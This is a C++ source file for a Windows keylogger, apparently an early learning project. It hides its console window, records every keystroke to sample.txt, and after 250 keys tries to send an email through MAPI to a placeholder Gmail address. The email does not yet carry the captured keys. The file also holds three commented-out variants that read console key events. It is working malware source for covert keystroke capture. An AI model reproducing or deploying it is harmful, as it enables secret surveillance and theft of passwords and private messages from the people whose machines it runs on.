// 001_Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <mmsystem.h>
#include <mapi.h>
#include <stdio.h>
#include <string>
using namespace std;

void send_email(const char* recipient, const char* subject, const char* message) {
    MapiMessage email;
    memset(&email, 0, sizeof(MapiMessage));
    email.lpszSubject = subject;
    email.lpszNoteText = message;
    email.nRecipCount = 1;
    MapiRecipDesc recipient_desc;
    memset(&recipient_desc, 0, sizeof(MapiRecipDesc));
    recipient_desc.lpszName = recipient;
    recipient_desc.ulRecipClass = MAPI_TO;
    email.lpRecips = &recipient_desc;

    if (MAPISendMail(0, 0, &email, MAPI_LOGON_UI | MAPI_DIALOG, 0) != SUCCESS_SUCCESS) {
        printf("Error sending email.\n");
    }
}


void write_to_file(char character, char* filename) {
    FILE* fp;
    fp = fopen(filename, "a");
    if (fp == NULL) {
        printf("File couldn't be opened.\n");
        return;
    }
    fprintf(fp, "%c", character);
    fclose(fp);
}

int main() {
    const char* email = "senin-epostan@gmail.com";
    const char* subject = "senin-konun";
    const char* message = "senin mesajýn. Örnek: Merhaba nasýlsýn?";
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    string totalChars = "";
    while (1) {
        for (int i = 0; i < 256; i++) {
            short state = GetAsyncKeyState(i);
            char fileName[] = "sample.txt";
            if (state & 0x0001) {
                printf("Key event: %c\n", (char)i);
                write_to_file((char )i, fileName);
                totalChars += (char)i;
            }
        }
        if (totalChars.size() == 250) {
            send_email(email, subject, message);
            totalChars = "";
        }
    }

    return 0;
}



/*
#include <windows.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[]) {
    while (1) {
        for (int i = 0; i < 256; i++) {
            short state = GetAsyncKeyState(i);
            if (state & 0x0001) {
                _tprintf(_T("Key event: %c\n"), (char)i);
            }
        }
    }

    return 0;
}
*/

/*
#include <windows.h>
#include <stdio.h>

int main() {
    INPUT_RECORD irInBuf[128];
    DWORD cNumRead;
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE)
        return 1;

    while (1) {
        if (!ReadConsoleInput(hStdin, irInBuf, 128, &cNumRead))
            return 1;

        for (DWORD i = 0; i < cNumRead; i++) {
            if (irInBuf[i].EventType == KEY_EVENT && irInBuf[i].Event.KeyEvent.bKeyDown) {
                printf("Key event: %c\n", irInBuf[i].Event.KeyEvent.uChar.AsciiChar);
            }
        }
    }

    return 0;
}
*/


/*
#include <windows.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[]) {
    INPUT_RECORD irInBuf[128];
    DWORD cNumRead;
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE)
        return 1;

    while (1) {
        if (!ReadConsoleInput(hStdin, irInBuf, 128, &cNumRead))
            return 1;

        for (DWORD i = 0; i < cNumRead; i++) {
            if (irInBuf[i].EventType == KEY_EVENT && irInBuf[i].Event.KeyEvent.bKeyDown) {
                tprintf(_T("Key event: %c\n"), irInBuf[i].Event.KeyEvent.uChar.AsciiChar);
            }
        }
    }

    return 0;
}
*/

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
